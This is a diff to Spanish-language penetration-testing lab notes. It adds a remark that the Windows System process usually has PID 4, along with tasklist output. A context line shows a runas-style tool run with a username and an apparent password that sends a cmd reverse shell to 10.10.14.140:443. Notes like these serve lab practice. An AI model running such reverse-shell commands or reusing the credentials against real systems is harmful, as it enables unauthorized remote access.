@@ -4900,7 +4900,16 @@ Este es un programa como el runas del mismo windows pero abierto usalo para una 
 ```
 .\r.exe C.Bum Tikkycoll_431012284 -r 10.10.14.140:443 cmd
 ```
+## System pro lo regular tiene el PID tiene el numero 4
 
+```
+PS C:\inetpub\development> tasklist /FI "PID eq 4"
+tasklist /FI "PID eq 4"
+
+Image Name                     PID Session Name        Session#    Mem Usage
+========================= ======== ================ =========== ============
+System                           4 Services                   0        104 K
+```
 
 # Priv Escalation  ARENA
 
